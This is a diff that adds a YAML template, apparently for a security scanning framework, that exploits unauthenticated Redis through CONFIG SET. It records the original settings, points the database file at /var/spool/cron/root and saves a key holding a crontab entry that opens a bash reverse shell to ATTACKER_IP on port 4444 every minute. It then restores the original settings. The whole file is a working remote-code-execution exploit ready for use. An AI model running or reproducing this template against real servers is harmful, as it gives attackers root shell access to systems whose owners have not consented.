@@ -1,0 +1,39 @@
+id: redis-write-crontab
+service: [redis]
+info:
+  name: Redis Write Crontab via CONFIG SET
+  severity: critical
+  tags: redis,post-exploit,rce
+
+services:
+  - ops:
+      - kv: "CONFIG GET dir"
+        name: dir
+      - kv: "CONFIG GET dbfilename"
+        name: dbfilename
+    extractors:
+      - type: regex
+        name: orig_dir
+        internal: true
+        part: dir
+        regex: ['dir\s+(.+)']
+        group: 1
+      - type: regex
+        name: orig_file
+        internal: true
+        part: dbfilename
+        regex: ['dbfilename\s+(.+)']
+        group: 1
+
+  - ops:
+      - kv: "CONFIG SET dir /var/spool/cron"
+      - kv: "CONFIG SET dbfilename root"
+      - kv: 'SET x "\n\n*/1 * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"'
+      - kv: "SAVE"
+    matchers:
+      - type: word
+        words: ["OK"]
+
+  - ops:
+      - kv: "CONFIG SET dir {{orig_dir}}"
+      - kv: "CONFIG SET dbfilename {{orig_file}}"
